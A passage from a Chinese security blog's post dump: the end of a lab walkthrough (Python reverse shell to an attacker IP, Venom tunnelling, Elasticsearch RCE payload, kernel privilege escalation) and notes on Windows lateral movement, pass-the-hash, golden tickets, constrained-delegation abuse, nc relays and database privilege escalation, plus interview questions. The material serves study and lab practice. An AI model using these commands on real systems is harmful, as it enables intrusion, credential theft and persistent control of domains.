socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.173&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); 执行前 Kali 应该先监听自身的 4444 端口， 然后执行代码，成功回弹！！！ 在这里其实还遇到一个小问题，就是当 shell 是 &#x2F;bin&#x2F;bash 的时候，回弹的时候没有回显，于是尝试换成 sh ， 回弹就有回显了，我也不知道为什么。 拿下 shell 后 先看看自己的权限， 发现是 root， 就这？ 然后去看系统中存在什么文件，发现很不对劲，文件中存在Dockerfile文件，Dockerfile 是 docker 部署的一个模板文件。 初步断定闹了半天拿下的是一个docker 容器的 shell。 可以尝试使用以下两个命令来查证是否docker 容器 1234ls /.dockerenv# 根目录下若存在dockerenv， 基本上可断定为docker容器cat /proc/1/cgroup# pid为1是初始化进程，若初始化进程中包含了docker映像的信息，可确认为docker容器 确认为 docker 容器后，下一步是如何从 docker容器中 突破出来，最终拿到服务器的 权限。 内网穿透确认容器地址， 为 172 开头的地址 可以将容器地址看作内网地址，可以在内网中进行主机发现，看看是否还存在其他容器。 最简单进行主机发现的方法是一个个 IP 地址 去 ping， 但手工操作其实很麻烦，尝试用shell脚本完成操作 可以发现 很快就有三个 IP 回包了， 接下来的都没有回包， 初步收集到 内网网段 三个地址。 已知 172.17.0.2 为容器地址，想要用Kali对另外两个地址进行信息收集，必须进行内网穿透，把Kali 到内网的路由 打通， 这里 用到 内网穿透工具 Venom。 首先在 Kali 上运行服务端程序 启动侦听 为了让 目标靶机 能 获取到Venom客户端程序，在 Kali 目录下 开启 http 服务， 然后在目标靶机上使用 wget 来获取 获取客户端程序后，赋予程序可执行权限。用客户端连接远程 Kali 机器 可以看到程序成功执行， 跟服务端的连接也建立起来了。在服务器端，通过 show 命令 可以看到已经有一个节点 连接上来了，可以 goto 到 此节点 并启用一个监听1080 端口的 socks 代理，Kali 的 所有工具 可以通过 proxychains 这个工具 挂上这个代理去访问 容器内网的整个网段 修改proxychains 配置文件，把代理类型改成 socks5， 代理端口 改成 1080 挂载好后，以 proxychains 为前缀，就可以对内网的主机 进行端口扫描了 123proxychains nmap -sT -Pn 172.17.0.1# -Pn 代表不进行主机发现， 直接对目标进行深层次的扫描# -sT 进行TCP扫描 扫描得出 172.17.0.1 开放的端口 跟 目标靶机 开放的端口一样， 都是22 和 5000浏览器挂代理后对172.17.0.1的5000端口进行访问 继续对服务版本进行探测，发现 跟 目标靶机的 服务版本也完全一模一样。浏览器挂载代理后，访问172.17.0.1的5000端口，发现页面 也跟我们直接访问靶机地址的一模一样，可以确定172.17.0.1就是目标靶机，只不过该地址是靶机面向容器内网的地址。 继续对172.17.0.3 进行端口扫描， 发现开了9200 端口， 对服务进行探测后发现是Elasticsearch 针对服务搜寻漏洞 1searchsploit Elasticsearch 发现有RCE可做利用，将漏洞利用代码拷贝到当前目录下，简单看一下脚本的执行例子。 可先尝试一下执行脚本，一般脚本在注释或者报错提示里都有脚本执行的格式，按照格式一步一步来 第一次利用脚本36337.py的时候会报错，原因是elasticsearch服务里面没有数据，所以不能通过elasticsearch来搜索进而执行命令。 解决方法是先插入一条数据，再进行脚本的利用。 1proxychains curl -XPOST &#x27;http://172.17.0.3:9200/twitter/user/yren&#x27; -d &#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27; 1proxychains curl -XPOST &#x27;http://172.17.0.3:9200/_search?pretty&#x27; -d &#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;).getText()&quot;&#125;&#125;&#125;&#x27; 成功拿到第二台容器的shell，查看权限，发现也是 root （没什么卵用） 在目录中发现一个敏感文件 passwords， 有可能是密码文件 查看文件，发现密码做了哈希， 去 somd5 尝试破解 解密完密码后，可尝试使用账号密码去登录目标靶机的SSH 发现 John 用户 可直接登录到 目标靶机的 22 端口， 尝试用 sudo -s 提权，发现 John 并不能直接提升为 root 权限 利用内核漏洞提权此时需要考虑使用系统内核漏洞去提权 使用 searchsploit 搜索 LInux 3.13 相关的漏洞利用代码， 选用 37292.c 这个 exp，但这个 exp 有个问题。首先目标靶机上是没有装 gcc 的， 也就是说 所有的c语言代码只能在 Kali 机器上进行编译。在查看 EXP 的过程中， 发现有一段代码编译了一个c文件成so文件，再对这个so文件进行调用 —— 意味着就算在 Kali 上对 EXP 进行了编译，放到目标靶机上仍无法执行成功。 解决的思路是：修改EXP 代码， 将编译相关的代码段去掉， 然后直接找到编译好的so文件进行调用。 同样是在 Kali 上启用 http 服务，然后在目标主机上获取到需要的文件 为了执行的方便，在获取到 exp 和 so 文件后，将文件移动到 &#x2F;tmp 目录去执行 先给 exp 赋予可执行权限 ，然后执行。 在执行的过程中，exp 会去调用 目录下的 so文件进行提权，执行结束后 使用 id 命令查看权限， 已经 拿到了目标 靶机的 root 权限了 思路总结面对靶机，首先是进行主机发现。 针对发现的主机，要进行端口扫描和端口服务的发现。 若服务中有Web应用，尝试在 Web 应用中找突破点，在该靶机中，我们遇到了一个代码执行，并通过Python脚本成功获得了一个反弹shell，但通过对系统文件的搜寻发现被困在一个容器系统中。 使用 ICMP 对容器系统中的资产进行发现，发现了另外两个地址。 为了使用 Kali 的工具对内网 的容器系统进行渗透，利用Venom工具建立了从Kali 到容器内网的隧道，并在 Kali 上开启了 监听1080端口 的代理。通过proxychains 挂载这个代理在Kali 上访问内网。 发现其中一个资产开启了9200端口，判断为 Elasticsearch 服务，通过对其漏洞的利用拿下第二个docker容器的shell，并在该容器中发现了密码文件。 利用密码文件破译出的账号密码尝试登录目标系统的SSH并成功登录，却发现自己只是一个普通用户。 考虑到内核版本比较老，尝试通过内核漏洞进行提权。 由于EXP中调用了gcc进行C文件的编译，所以把关于编译的代码全部删掉，直接找到编译好的so文件进行直接调用。 最终成功获得目标主机的root权限！！！ 耶！","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"WP","slug":"WP","permalink":"https://j47erry.github.io/tags/WP/"}],"author":"J47erry"},{"title":"#横向移动姿势","slug":"横向移动姿势","date":"2022-07-15T07:45:00.000Z","updated":"2023-03-09T07:02:46.007Z","comments":true,"path":"2022/07/15/横向移动姿势/","link":"","permalink":"https://j47erry.github.io/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"0x00.IPC$横向移动IPC$是windows自带的远程连接命令。IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”。 使用IPC$连接的条件： 1.目标机器没有禁用IPC$连接，没有防火墙拦截IPC$。目标开启139，445端口。（能走445端口就不要走139端口） 2.目标机器管理员开启IPC$共享服务 3.获取了目标管理员的明文账号密码 1231.建立连接 net use \\\\ip\\ipc$ &quot;password&quot; /user:&quot;administrator&quot; net use \\\\ip\\c$ &quot;password&quot; /user:&quot;administrator&quot; 122.查看网络连接，是否连接成功 net use 1233.通过命令访问可以访问的文件夹 dir \\\\ip\\c$ dir \\\\ip\\admin$ //一般都访问这两个文件夹 ipc访问也可能爆出以下的错误： 1234567891.错误号 5，拒绝访问（很可能你使用的用户不是管理员权限的，先提升权限）2.错误号 51，Windows 无法找到网络路径（网络有问题）3.错误号 53，找不到网络路径（ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤））4.错误号 67，找不到网络名（你的 lanmanworkstation 服务未启动；目标删除了 ipc$；）5.错误号 1219，提供的凭据与已存在的凭据集冲突（你已经和对方建立了一个ipc$，请删除后再连）6.错误号 1326，未知的用户名或错误密码7.错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型8.错误号 1792，试图登录，但是网络登录服务没有启动（目标NetLogon服务未启动[连接域控会出现此情况]）9.错误号 2242，此用户的密码已经过期（目标有帐号策略，强制定期要求更改密码） 当建立连接能够访问共享文件夹时，就上传木马 123451.使用copy命令复制木马到可访问的盘 copy c:\\hack.exe \\\\ip\\c$ /y copy c:\\hack.exe \\\\192.168.20.169\\c$ /y2.查看文件是否复制过去 dir \\\\ip\\c$ 使用计划任务启动木马，使目标上线 123456781. at 命令（win8 之后不在支持at命令） at \\\\ip &lt;path&gt; at \\\\192.168.20.169 c:\\hack.exe2. 使用schtasks.exe（使用win7-win10） sc \\\\ip create servicename binpath=&quot;path&quot; sc \\\\192.168.20.169 create hack binpath=&quot;c:\\hack.exe&quot; //创建服务 sc \\\\192.168.20.169 start hack //启动服务 sc \\\\192.168.20.169 delete hack //删除服务 0x01 Psexec横向Psexec是微软提供的一种远程命令行的工具 使用Psexec不需要目标开启3389端口 前提条件 12341.开启admin$共享2.并且防火墙放行//注意事项想连域控最好用域管理员账号密码连，不要用普通域账号密码连；连普通域内主机随便，用域管理员账号密码或者目标主机本地管理员账号密码都可以。 利用方式 123Psexec.exe -accepteula \\\\IP -u administrator -p password whoami //-accepteula 表示不弹框域中： Psexec.exe -accepteula \\\\IP -u domain\\administrator -p password commandpsexec.exe -accepteula \\\\IP -u domain\\administrator -p password -s cmd.exe //-s 返回system权限的shell 这里使用powershell 远程上线 0x02 wmic 横向从windows98起自带的工具，可以通过&#x2F;node 选项使用端口135上从远程过程调用（RPC）进行通信达到远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令 wmi相比psexec隐蔽性更强，无文件，无记录，操作多 wmic横向条件 1目标开启135，445 // 135管理口 ，445 回显口 wmic很强大，可以做很多的事情 1234561.查看进程信息 wmic /node:192.168.20.169/user:administrator /password:!@#Qwe123. process list2.远程创建进程 wmic /node:192.168.20.169/user:administrator /password:!@#Qwe123. process call create &quot;cmd.exe /c c:\\hack.exe&quot;3. 绕过一些杀软 wmic /node:127.0.0.1 process call create &quot;cmd.exe /c c:\\hack.exe&quot; 0x03 pth横向利用mimikatz hash传递12341.privilege::debug2.sekurlsa::logonPasswords //有当前机器的NTLM hash3.sekurlsa::pth /user:administrator /domain:(目标机器ip或者机器名) /ntlm:（hash值） 获取hash 传递hash 弹出新的cmd（这里不需要账号密码直接访问目标机器的c盘） 121.net use \\\\10.10.1.1292.dir \\\\10.10.1.129\\c$ 这里就可以参考前面，upload 然后种马 使用wmiexec.py 进行PTH下载地址：impacket impacket工具包里面的脚本 指定可以指定hash 并且可以走socks代理，很强大 123# python3 wmiexec.py 用户名:密码@IP# python3 wmiexec.py administrator:!@#QWE123@192.168.31.29 //账号密码横向# python3 wmiexec.py -hashes 00000000000000000000000000000000:e7114141b0337bdce1aedf5594706205 administrator@192.168.31.29 “whoami” //hash横向 ![wmiexec.py ](.&#x2F;..&#x2F;images&#x2F;wmiexec.py .png) ![wmiexec.py_2 ](.&#x2F;..&#x2F;images&#x2F;wmiexec.py_2 .png) 0x04 利用PTT进行横向票据传递攻击，常用MS14-068、白银票据、黄金票据。说到这里大家可以去了解了解kerberos协议。 kerberos大概的流程： 123451.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据 2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据 3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。 白银票据：有效的票据授予服务（伪造TGS） 黄金票据：伪造TGT并且有效的获得任何Kerberos服务 其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。打域控常用ms14-068 12# ms14-068.exe -u 域名 -s 域内普通用户的sid -p 域内普通用户的密码# MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456 这里如果使用python的ms14-068 123python ms14-068.py -uweb@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d10.10.10.149 -p !@#Qwe456 在这里生成票据后 用KrbCredExport 将.ccache文件格式转为kirbi格式的 1# python KrbCredExport.py TGT_web@hackbox.com.ccache user.ticket(可以自己随意命名) 利用msf和cs中的mimikatz 注入票据 1# kerberos_ticket_use c:\\user.ticket 利用mimikatz.exe 注入票据 1# kerberos::ptc (票据)TGT_web@hackbox.com.ccache 查看当前证书 是否导入 可以看出这个是有时间限制的 ，其实就是白银票据，只有几个小时时间可以访问域控！！ 删除票据： 1# klist purge 直接就可以访问域控了 现在就开始做黄金票据，永久后门 上传载荷，使DC上线 (我嫌弃麻烦就把DC机器直接桥接了，DC的IP变为192.168.31.167) 在msf中使用 123# dcsync_ntlm krbtgt administrator管理员权限使用# 拿到 krbtgt 账户的 sid 和ntlm 在cs中使用 123# dcsync hackbox.com hackbox\\krbtgt # 拿到 krbtgt 账户的 sid 和ntlm 在msf中使用生成黄金票据 1# golden_ticket_create -d hackbox.com -u test -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbgtt.ticket 然后清除普通域用户中的票据 cs和msf 都使用使用如下命令 1# kerberos_ticket_use （票据位置）/tmp/krbtgtt.ticket 注入票据 再次去看票据的时间，时间变为了2032年，就可以长久控制域控了。","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://j47erry.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"#某某安服实习生面试","slug":"某某安服实习生面试","date":"2022-06-22T13:44:00.000Z","updated":"2023-03-03T13:44:51.609Z","comments":true,"path":"2022/06/22/某某安服实习生面试/","link":"","permalink":"https://j47erry.github.io/2022/06/22/%E6%9F%90%E6%9F%90%E5%AE%89%E6%9C%8D%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95/","excerpt":"","text":"某某安服实习生面试啊~懒得整理了 发一下技术面（只对岗位分类，公司就不说了） 自我感觉回答的还OK，面试官也不错，整体面试感觉嘎嘎棒 拿到小厂offer了，虽然我也没投大厂，还是太菜了 安服&#x2F;渗透对内网了解到哪里呢？ 是自己搞还是跟着别人一起搞？在团队里面负责干嘛呢？ 打内网主要是用过什么工具？简单说一下 你打过哪些单位的内网？多吗？ 接触网络安全到现在多久了呀？ 学习是跟学校的人一起？还是什么？ 你学过哪些技能？ 接触过的数据库主要是mysql嘛？除此之外还有什么数据库？ mysql、mssql以及oracle三个数据库的区别 mysql数据库里面为什么会有information_schema这个呢？ 了解过嘛？ 大于哪个版本会有这个？ 什么类型的注入点才能写入？这个注入点同时还有支持哪两个注入呢？ 找到绝对路径的方法 注入报错的时候，程序内部为什么会显示报错 文件上传你试过哪些呢 struts2的漏洞了解嘛 简单说一下对网站测试的一整个思路 你这边有什么问题想问我的嘛 对top10哪个漏洞最为熟悉 sql注入的分类 绕waf mysql的分类 一次性获取全部数据的注入方式 mssql注入有了解嘛 延时注入的语句 mysql注入和mssql注入拿shell 文件上传了解嘛 文件上传传上去了但是403是什么原因 访问木马文件的时候，没有权限的话怎么突破 除了web，还有其他了解嘛，内网或者CTF方面 现在平常有在挖洞嘛 你以后的打算是什么？学习计划之类的。 sql注入原理、分类 防护sql注入 预编译的原理，预编译一定能防止sql注入嘛 讲讲堆叠注入 宽字节注入的原理 top10漏洞 讲讲反射性和存储型xss哪个经过服务器 数据库提权、mysql中的udf提权 如何横向渗透 收集的凭证有哪些 给你一个webshell，如何进行后渗透 linux系统横向测试 越权漏洞如何利用 无源码免杀和有源码免杀的原理 安开（首先说明这个岗位有点不太符合自我的预期，主要工作好像是给各个高校搭建靶场的一些杂事。具体大约问了30分钟，三个人同时问的，好像有点记不全了，大致就这些，自我感觉对工具使用问的挺多） 熟悉哪个板块？web安全还是逆向啥的 对于团队内部工作的流程（问的超多超仔细） sql注入的种类 sqlmap自动化注入常见的参数 burpsuit抓到数据包以后用sqlmap自动化的参数 windows和linux提权的类型 内网渗透和域渗透的流程 常见的报错函数 你常用的渗透工具 内网渗透你会用什么工具 谈谈常用工具的使用和具体用来干什么 你什么时候能来实习 hw（蓝队）windows创建隐藏账号 linux隐藏进程 mssql延时注入怎么快速获取数据 mysql写shell 常见中间件漏洞 常见容器漏洞 冰蝎加密特征 mimikatz无法读取明文密码，对方有杀毒软件怎么办 Linux查看隐藏进程 快速定位webshell windows提权类型 windows&#x2F;linux的应急流程 内网快速定位域管 内网快速定位域控 一句话木马怎么免杀 java反序列化的原理，主要是哪种协议 正向代理和反向代理 怎么快速检查Linux内文件被更改 渗透经验，最好是拿到shell 接触过厂商安全设备没","categories":[{"name":"面经","slug":"面经","permalink":"https://j47erry.github.io/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://j47erry.github.io/tags/%E9%9D%A2%E8%AF%95/"}],"author":"J47erry"},{"title":"#约束委派攻击","slug":"约束委派攻击","date":"2022-06-09T15:21:00.000Z","updated":"2023-03-05T15:11:32.849Z","comments":true,"path":"2022/06/09/约束委派攻击/","link":"","permalink":"https://j47erry.github.io/2022/06/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/","excerpt":"","text":"约束委派接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。 流程: 123456789101112131415161718192021222324251.用户向Service1发送请求2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。注:，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。 A。Service1已经通过验证，并且有一个有效的TGT。 B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。8.service1代表用户使用ST2请求访问Service29.Service2响应Service1的请求10.Service1将Service2的响应转发给User。 在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。 同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。 前期准备：122019：域控2016：域成员 ​ 域控机为域用户配置SPN，用于域用户配置约束委派 1setspn -U -A SQL/test win2016 此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。 为win2016用户配置约束委派，做win2019机器的cifs服务的委派 此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派 发现约束委派:使用Adfind.exe尝试发现约束委派 查找域中配置约束委派用户1AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto 发现win2016用户存在约束委派，委派了win2019机器的cifs服务 在域中查找配置了约束委派主机1AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto 可以看到主机Win2016存在约束委派，委派了域控win2019机器的cifs服务 攻击利用：域用户存在约束委派:kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据1kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /password:Admin#123 kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据利用mimikatz拿到域用户win2016的NTLM hash进行利用 1kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e 利用kekeo进行S4U伪造利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务 1tgs::s4u /tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com PTT利用拿到的TGS票据通过mimikatz进行ptt拿到域控机的cifs服务使用权限 1kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi 注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。 查看域控机的共享目录成功！ 域主机存在约束委派:通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据 12privilege::debugsekurlsa::logonpasswords 注:需要管理员权限才可拿到密码Hash kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT1tgt::ask /user:win2016$ /domain:vulntarget.com /NTLM:e0cd419213811fd910ca6c3c42d764e7 注:带有$符号的用户一般都是服务主机账户，而非普通用户 通过kekeo进行S4U伪造如此，成功拿到了对应委派服务的TGS票据 1kekeo # tgs::s4u /tgt:TGT_win2016$@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com PTT利用拿到的TGS票据1kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi 尝试对域控进行共享目录访问,利用成功！ 1dir \\\\win2019.vulntarget.com\\c$ 注: 此处进行tgs::s4u伪造时，申请的service是cifs&#x2F;win2019.vulntarget.com时；我们在使用时就应该是dir \\win2019.vulntarget.com\\c$ 这样才能访问成功，若dir \\win2019\\c$则会访问失败，反之亦然！ 域外利用域外使用adfind发现非约束&#x2F;约束委派主机或用户时，可使用如下命令:在域外探测存在约束委派的域用户账户:1AdFind.exe -h 10.0.10.110 -u vulntarget\\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo 在域外探测存在约束委派的域主机:1AdFind.exe -h 10.0.10.110 -u vulntarget\\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo 域外通过getST.py进行约束委派攻击(可通过隧道，需提前通过hosts文件绑定ip与主机名) 1python3 getST.py -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019.vulntarget.com -impersonate administrator vulntarget/win2016$ -dc-ip 10.0.10.110 -hashes: NTLM hash -spn: 约束委派指定的服务 -impersonate 伪造的用户 存在约束委派的域主机名 -dc-ip: dc地址 拿到administrator.ccache 利用export加载环境变量 1export KRB5CCNAME=administrator.ccache 注: KPB5CCNAME 变量名不可变 利用secretsdump.py 拖取hash1python3 secretsdump.py -k -no-pass win2019.vulntarget.com -dc-ip 10.0.10.110 注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。 总结嘿嘿嘿","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://j47erry.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"#内网渗透备忘录","slug":"内网渗透备忘录","date":"2022-05-22T10:40:00.000Z","updated":"2022-11-25T08:57:13.890Z","comments":true,"path":"2022/05/22/内网渗透备忘录/","link":"","permalink":"https://j47erry.github.io/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/","excerpt":"","text":"0x00 前言接触安全数月有余，整理一下内网学习笔记。 0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行 1nc -lvp 3333 &#x2F;&#x2F;目标机执行 1nc -lvp 3333 -e c:\\windows\\system32\\cmd.exe &#x2F;&#x2F;中间机执行 1nc -v 攻击机ip 3333 -e “nc -v 目标机ip 3333” #frp内网穿透配置&#x2F;&#x2F;内网机器上安装frpc，并修改 frpc.ini： 1234567891011[common]server_addr = 101.120.252.139server_port = 12345token = setyourowntokentcp_mux = true[web]type = tcplocal_ip = 192.168.1.10local_port = 8080remote_port = 8080 &#x2F;&#x2F;外网服务器上安装frps。 并修改 frps.ini： 1234567891011[common]bind_port = 12345log_file = ./frps.log# debug, info, warn, errorlog_level = infolog_max_days = 3# auth tokentoken = setyourowntokenmax_pool_count = 50tcp_mux = truesubdomain_host = some.domain.com #花生壳内网穿透官网参考：https://hsk.oray.com/ # Cloudflare argo tunnel官网参考： https://developers.cloudflare.com 0x02 内网信息收集内网渗透测试核心就是信息收集。对测试目标的了解越多，测试越容易进行。 2.1当前主机信息收集在主机上信息收集主要包括操作系统、权限、内网ip地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。 &#x2F;&#x2F;用户列表 1net user #分析本机用户列表 &#x2F;&#x2F;本机服务 1wmic service list brief &#x2F;&#x2F;进程列表 1tasklist /svc //主要分析软件、邮件客户端、VPN和杀毒软件等进程 &#x2F;&#x2F;会话显示 1net session &#x2F;&#x2F;端口列表 1netstat -ano //查看端口列表、本机开放的端口所对应的服务和应用程序 &#x2F;&#x2F;补丁列表 12wmic qfe get Caption.Description,HotFixID,InstalledOn //会显示补丁的名称、描述、ID、安装时间等信息（也可以通过systeminfo看补丁信息） &#x2F;&#x2F;共享列表 1net share &#x2F;&#x2F;软件安装信息 1wmic product get name,version //分析杀毒软件 &#x2F;&#x2F;还原防火墙墙 1netsh advfirewall reset 2.2域内存活主机探测#NetBIOS协议快速探测内网1nbt.exe 192.168.1.0/20 Token含义： 1234567SHARING 存在正在运行的文件和打印共享服务，但不一定有内容共享DC 可能是域控制器U=USER 登录名为User的用户（可能会存在误报）IIS 可能安装IIS服务器EXCHANGE 可能安装了ExchangeNOTES 可能安装了Lotus Notes电子邮件客户端? 没有识别出NetBIOS资源 #ICMP协议快速探测内网12for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;//该命令表示循环ping探测整个c段 #ARP扫描探测内网1.直接上传arp.exe 1arp.exe -t 192.168.1.0/20 2.Empire使用arpscan模块 1usemodule situational_awareness/network/arpscan 3.Nishang使用Invoke-ARPScan.ps1脚本将脚本上传到目标主机中运行（也可以输入命令远程加载脚本） #TCP&#x2F;UDP端口探测内网ScanLine中TCP&#x2F;UDP端口扫描 1scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\\windows\\temp\\log.txt -p 192.168.1.1-254 /b tips：可以在白天和晚上分别进行探测，进而对比存活主机和对应的ip地址。 2.3端口扫描#telnet命令进行扫描12telnet DC [端口号]//适用于探测某个常规高危端口是否开放 #Metasploit端口扫描1use auxiliary/scanner/portscan/tcp 提供多种端口扫描技术，可以通过下面的命令进行搜索 1search portscan #Nishang模块进行扫描Invoke-PortScan是Nishang的端口扫描模块，可以发现主机，解析主机名，扫描端口。 1Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost 0x03 权限提升最高权限： Windows：system（TrustedInstaller不常用） Linux：root Windows（只提3种）:#系统内核溢出&#x2F;&#x2F;确定补丁的个数和种类 寻找提权exp编号 1systeminfo &#x2F;&#x2F;查看端口和进程和服务 查询杀软防护 寻找exp 1tasklist /svc &#x2F;&#x2F;利用Metasploit的模块发现缺失补丁 1use post/windows/gather/enum_patches #数据库提权mysql（利用udf提权） 只有在root权限下 上传udf.dll文件（如果mysql版本&gt;5.1.就要将udf.dll文件放入mysql&#x2F;lib&#x2F;plugin（可以自己创建文件夹），如果版本&lt;5.1，就要将文件放入c盘Windows下面） &#x2F;&#x2F;通过密码连接数据库 （翻数据库文件，连接密码一般存在于inc&#x2F;config里面） &#x2F;&#x2F;创建数据表连接数据库以后操作 1create table udfeval（shellcode longblob） &#x2F;&#x2F;将udf文件放入数据库中 1insert into udfeval values （load_file（&quot;udf路径&quot;）） &#x2F;&#x2F;把创建表的信息导出 1select shellload from udfeval into dumpfile “c://windows/udf.dll” &#x2F;&#x2F;创建func函数 1create function cmdshell return string soname ‘udf.dll’ &#x2F;&#x2F;查找是否存在udf 1select * from func &#x2F;&#x2F;查询权限 1select cmdshell（‘whoami’） mssql（利用xp_cmdshell） sa权限： 123456找数据库配置文件config，查看数据库类型/权限/密码查看当前权限，简单systeminfo查看补丁补丁很多的情况下，通过密码连接数据库(sqlmap有--os-shell可以直接上线利用)在数据库中打开xp_cmdshell调用exeo master.dbo.xp_cmdshell &#x27;whoami&#x27;创建账号exec master.dbo.xp_cmdshell &#x27;net user hack hack/add&#x27;将账号加入管理组才能正常登录exec master.dbo.xp_cmdshell &#x27;net localgroup administrator hack/add &#x27; 普通权限： 查看服务是否存在sql server 